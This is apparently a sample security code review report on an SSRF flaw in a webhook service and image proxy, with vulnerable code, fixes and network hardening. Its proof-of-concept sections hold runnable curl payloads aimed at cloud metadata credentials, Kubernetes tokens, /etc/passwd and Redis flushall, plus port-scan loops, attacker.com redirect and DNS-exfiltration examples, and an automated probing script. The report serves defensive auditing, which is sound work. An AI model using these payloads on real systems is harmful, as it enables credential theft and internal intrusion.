# Security Code Review Report

## Target Information
- **Domain**: webhooks.example.com
- **Review Date**: 2024-11-16
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/webhook-service
- **Commit Hash**: 2e8b4f9a6c3d7e1b5f9a2c8d4e7b3a6f9c5d2e8a

---

## Executive Summary

This report identifies a critical Server-Side Request Forgery (SSRF) vulnerability in the webhook notification service at webhooks.example.com. The vulnerability exists in the webhook callback functionality and image proxy service, allowing attackers to make requests to internal services, scan internal networks, and potentially access cloud metadata endpoints.

---

## Vulnerability Details

### 1. SSRF in Webhook Callback URL

**Severity**: CRITICAL
**CWE**: CWE-918 (Server-Side Request Forgery)
**CVSS Score**: 9.3
**File**: `services/webhookService.js:89`
**Git Commit**: 2e8b4f9a6c3d7e1b5f9a2c8d4e7b3a6f9c5d2e8a

#### Description
The webhook service allows users to register callback URLs for event notifications. The application makes HTTP POST requests to these URLs without proper validation, allowing attackers to specify internal URLs and force the server to make requests to internal resources, cloud metadata endpoints, and arbitrary external services.

#### Vulnerable Code
```javascript
// services/webhookService.js

const axios = require('axios');

class WebhookService {
    async registerWebhook(userId, eventType, callbackUrl) {
        // VULNERABLE: No URL validation
        const webhook = await Webhook.create({
            userId,
            eventType,
            callbackUrl,  // User-controlled, no validation
            active: true
        });

        return webhook;
    }

    async triggerWebhook(webhookId, eventData) {
        const webhook = await Webhook.findById(webhookId);

        if (!webhook || !webhook.active) {
            return;
        }

        try {
            // VULNERABLE: Making request to user-controlled URL
            const response = await axios.post(webhook.callbackUrl, {
                event: webhook.eventType,
                data: eventData,
                timestamp: new Date()
            }, {
                timeout: 10000,
                maxRedirects: 5  // Follows redirects - can be abused
            });

            // Log response - may expose internal data
            logger.info('Webhook triggered', {
                url: webhook.callbackUrl,
                status: response.status,
                data: response.data
            });

        } catch (error) {
            logger.error('Webhook failed', {
                url: webhook.callbackUrl,
                error: error.message
            });
        }
    }
}
```

```javascript
// services/imageProxy.js

const axios = require('axios');
const sharp = require('sharp');

// VULNERABLE: Image proxy without URL validation
exports.proxyImage = async (req, res) => {
    const { url } = req.query;

    if (!url) {
        return res.status(400).json({ error: 'URL required' });
    }

    try {
        // VULNERABLE: Fetches image from any URL
        const response = await axios.get(url, {
            responseType: 'arraybuffer',
            timeout: 10000
        });

        // Process and return image
        const processed = await sharp(response.data)
            .resize(800, 600)
            .jpeg()
            .toBuffer();

        res.set('Content-Type', 'image/jpeg');
        res.send(processed);

    } catch (error) {
        res.status(500).json({ error: 'Failed to load image' });
    }
};
```

#### Proof of Concept

**1. AWS Metadata Exploitation:**
```bash
# Register webhook pointing to AWS metadata
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "user.created",
    "callbackUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# When webhook is triggered, server will make request to AWS metadata
# and potentially log the response containing IAM credentials

# Trigger the webhook
curl -X POST https://webhooks.example.com/api/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "email": "user@test.com"
  }'

# Check webhook logs (if accessible) for leaked credentials
```

**2. Internal Network Scanning:**
```bash
# Register webhooks for common internal services
for ip in 192.168.1.{1..254}; do
  for port in 22 80 443 3306 5432 6379 9200; do
    curl -X POST https://webhooks.example.com/api/webhooks \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"eventType\": \"scan.test\",
        \"callbackUrl\": \"http://${ip}:${port}/\"
      }"
  done
done

# Trigger webhooks and analyze timing/errors to identify open ports
```

**3. Redis Exploitation via SSRF:**
```bash
# Redis protocol smuggling
# Register webhook with Redis RESP protocol in URL
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "redis.exploit",
    "callbackUrl": "http://redis.internal:6379/"
  }'

# Or use gopher protocol if supported
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "redis.exploit",
    "callbackUrl": "gopher://redis.internal:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
  }'
```

**4. Image Proxy SSRF:**
```bash
# Use image proxy to access AWS metadata
curl "https://webhooks.example.com/api/image-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role"

# Access internal services
curl "https://webhooks.example.com/api/image-proxy?url=http://admin.internal:8080/admin/config"

# Access local files (if file:// protocol supported)
curl "https://webhooks.example.com/api/image-proxy?url=file:///etc/passwd"

# Port scanning via image proxy
for port in {1..1000}; do
  curl -s "https://webhooks.example.com/api/image-proxy?url=http://192.168.1.10:${port}" \
    -o /dev/null -w "%{http_code} Port ${port}\n"
done
```

**5. Bypass IP Validation via DNS Rebinding:**
```bash
# Set up DNS rebinding attack
# Domain that resolves to external IP first, then internal IP

# Register webhook with rebinding domain
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "dns.rebind",
    "callbackUrl": "http://rebind.attacker.com/internal-access"
  }'

# rebind.attacker.com resolves to:
# - First request: 1.2.3.4 (external, passes validation)
# - Second request: 192.168.1.100 (internal, bypasses check)
```

**6. Redirect-Based SSRF:**
```bash
# Set up redirect on attacker server
# http://attacker.com/redirect -> 302 -> http://169.254.169.254/

curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "redirect.attack",
    "callbackUrl": "http://attacker.com/redirect-to-metadata"
  }'

# Server follows redirect to internal resource
```

**7. Blind SSRF Data Exfiltration:**
```bash
# Use DNS exfiltration for blind SSRF
# Register webhook that causes DNS lookups with data in subdomain

curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "dns.exfil",
    "callbackUrl": "http://SECRET-DATA.attacker.com/"
  }'

# Monitor DNS logs at attacker.com to receive exfiltrated data
```

**8. Accessing Internal Kubernetes API:**
```bash
# Access Kubernetes service from pod
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "k8s.exploit",
    "callbackUrl": "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets"
  }'

# Or access service account token
curl "https://webhooks.example.com/api/image-proxy?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
```

**9. Elasticsearch Exploitation:**
```bash
# Access internal Elasticsearch
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "es.exploit",
    "callbackUrl": "http://elasticsearch.internal:9200/_cat/indices"
  }'

# Dump data
curl -X POST https://webhooks.example.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "eventType": "es.dump",
    "callbackUrl": "http://elasticsearch.internal:9200/users/_search?size=10000"
  }'
```

**10. Automated SSRF Exploitation:**
```python
#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://webhooks.example.com"
TOKEN = "your-auth-token"

headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Internal targets to probe
targets = [
    # AWS Metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",

    # Internal services
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:6379",
    "http://localhost:9200",
    "http://admin.internal:8080",
    "http://db.internal:5432",

    # Kubernetes
    "https://kubernetes.default.svc/api/v1/namespaces",

    # Common internal IPs
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1"
]

for i, target in enumerate(targets):
    print(f"[*] Testing target {i+1}/{len(targets)}: {target}")

    # Register webhook
    webhook_data = {
        "eventType": "ssrf.test",
        "callbackUrl": target
    }

    response = requests.post(
        f"{BASE_URL}/api/webhooks",
        headers=headers,
        json=webhook_data
    )

    if response.status_code == 200:
        webhook_id = response.json()['id']
        print(f"[+] Webhook registered: {webhook_id}")

        # Trigger webhook
        time.sleep(1)
        trigger = requests.post(
            f"{BASE_URL}/api/webhooks/{webhook_id}/trigger",
            headers=headers,
            json={"test": "data"}
        )

        print(f"[+] Triggered: {trigger.status_code}")

    time.sleep(0.5)
```

#### Impact
- **Cloud Credential Theft**: AWS/Azure/GCP IAM credentials
- **Internal Network Access**: Access to databases, admin panels
- **Port Scanning**: Map internal infrastructure
- **Data Exfiltration**: Access to internal APIs and services
- **Service Disruption**: DOS internal services
- **Kubernetes Compromise**: Access to cluster secrets
- **Lateral Movement**: Pivot to internal systems

#### Remediation

**Comprehensive SSRF Protection:**

```javascript
// services/webhookService.js - SECURE VERSION

const axios = require('axios');
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

class WebhookService {
    // Allowlist of permitted domains
    ALLOWED_DOMAINS = [
        'webhook.site',
        'requestbin.com',
        'trusted-partner.com'
    ];

    // Blocklist of dangerous hosts
    BLOCKED_HOSTS = [
        'localhost',
        'metadata',
        'metadata.google.internal',
        'instance-data'
    ];

    // Blocked IP ranges
    BLOCKED_RANGES = [
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
        '127.0.0.0/8',
        '169.254.0.0/16',
        '::1/128',
        'fc00::/7',
        'fe80::/10'
    ];

    async isUrlSafe(urlString) {
        try {
            const url = new URL(urlString);

            // 1. Only allow HTTP/HTTPS
            if (!['http:', 'https:'].includes(url.protocol)) {
                return { safe: false, reason: 'Only HTTP/HTTPS allowed' };
            }

            // 2. Check domain allowlist
            const hostname = url.hostname.toLowerCase();
            const isAllowed = this.ALLOWED_DOMAINS.some(domain =>
                hostname === domain || hostname.endsWith(`.${domain}`)
            );

            if (!isAllowed) {
                return { safe: false, reason: 'Domain not in allowlist' };
            }

            // 3. Check blocked hostnames
            if (this.BLOCKED_HOSTS.some(blocked => hostname.includes(blocked))) {
                return { safe: false, reason: 'Blocked hostname' };
            }

            // 4. Resolve DNS and check IP
            const addresses = await dns.resolve4(hostname);

            for (const address of addresses) {
                const addr = ipaddr.parse(address);

                // Check if private IP
                if (addr.range() !== 'unicast') {
                    return { safe: false, reason: `IP ${address} is not public` };
                }

                // Check against blocked ranges
                for (const range of this.BLOCKED_RANGES) {
                    const [network, bits] = range.split('/');
                    const rangeAddr = ipaddr.parseCIDR(`${network}/${bits}`);
                    if (addr.match(rangeAddr)) {
                        return {
                            safe: false,
                            reason: `IP ${address} in blocked range`
                        };
                    }
                }
            }

            // 5. Check port (optional)
            const port = url.port || (url.protocol === 'https:' ? 443 : 80);
            if (![80, 443, 8080].includes(parseInt(port))) {
                return { safe: false, reason: 'Port not allowed' };
            }

            return { safe: true };

        } catch (error) {
            return { safe: false, reason: `Validation error: ${error.message}` };
        }
    }

    async registerWebhook(userId, eventType, callbackUrl) {
        // Validate URL
        const validation = await this.isUrlSafe(callbackUrl);

        if (!validation.safe) {
            throw new Error(`Invalid callback URL: ${validation.reason}`);
        }

        const webhook = await Webhook.create({
            userId,
            eventType,
            callbackUrl,
            active: true
        });

        return webhook;
    }

    async triggerWebhook(webhookId, eventData) {
        const webhook = await Webhook.findById(webhookId);

        if (!webhook || !webhook.active) {
            return;
        }

        // Re-validate URL before making request
        const validation = await this.isUrlSafe(webhook.callbackUrl);

        if (!validation.safe) {
            logger.warn('Webhook URL validation failed', {
                webhookId,
                url: webhook.callbackUrl,
                reason: validation.reason
            });
            return;
        }

        try {
            const response = await axios.post(webhook.callbackUrl, {
                event: webhook.eventType,
                data: eventData,
                timestamp: new Date()
            }, {
                timeout: 5000,
                maxRedirects: 0,  // Don't follow redirects
                validateStatus: (status) => status < 500,
                headers: {
                    'User-Agent': 'WebhookService/1.0'
                }
            });

            logger.info('Webhook delivered', {
                webhookId,
                status: response.status
                // Don't log response data
            });

        } catch (error) {
            logger.error('Webhook delivery failed', {
                webhookId,
                error: error.message
                // Don't expose URL or response details
            });
        }
    }
}
```

**Secure Image Proxy:**

```javascript
// services/imageProxy.js - SECURE VERSION

const axios = require('axios');
const sharp = require('sharp');
const { isUrlSafe } = require('../utils/urlValidator');

exports.proxyImage = async (req, res) => {
    const { url } = req.query;

    if (!url) {
        return res.status(400).json({ error: 'URL required' });
    }

    // Validate URL
    const validation = await isUrlSafe(url, {
        allowedDomains: ['cdn.example.com', 'images.example.com']
    });

    if (!validation.safe) {
        return res.status(403).json({
            error: 'Invalid image URL',
            reason: validation.reason
        });
    }

    try {
        const response = await axios.get(url, {
            responseType: 'arraybuffer',
            timeout: 5000,
            maxRedirects: 0,
            maxContentLength: 10 * 1024 * 1024, // 10MB max
            headers: {
                'User-Agent': 'ImageProxy/1.0'
            }
        });

        // Verify content type is image
        const contentType = response.headers['content-type'];
        if (!contentType || !contentType.startsWith('image/')) {
            return res.status(400).json({ error: 'URL is not an image' });
        }

        const processed = await sharp(response.data)
            .resize(800, 600, { fit: 'inside' })
            .jpeg({ quality: 80 })
            .toBuffer();

        res.set('Content-Type', 'image/jpeg');
        res.set('Cache-Control', 'public, max-age=86400');
        res.send(processed);

    } catch (error) {
        res.status(500).json({ error: 'Failed to process image' });
    }
};
```

---

## Recommendations

1. **Immediate Actions** (within 4 hours):
   - Implement URL allowlist validation
   - Disable webhook service temporarily
   - Block access to cloud metadata at network level
   - Review webhook logs for exploitation
   - Rotate cloud credentials as precaution

2. **Short-term Actions** (within 1 week):
   - Implement DNS resolution validation
   - Add IP range blocking
   - Disable URL redirects
   - Implement rate limiting
   - Add network egress filtering
   - Deploy WAF rules

3. **Long-term Improvements**:
   - Use dedicated webhook processing service
   - Implement network segmentation
   - Regular security audits
   - Automated vulnerability scanning
   - Security monitoring and alerting

---

## Network-Level Protection

**Block cloud metadata endpoints:**
```bash
# iptables rules
iptables -A OUTPUT -d 169.254.169.254 -j DROP
iptables -A OUTPUT -d 169.254.169.253 -j DROP

# Block private IP ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

**AWS IMDSv2 (requires session token):**
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

---

## Timeline
- **Discovery**: 2024-11-14
- **Verification**: 2024-11-15
- **Report Delivered**: 2024-11-16
- **Expected Fix**: IMMEDIATE (Critical Priority)

---

## References
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
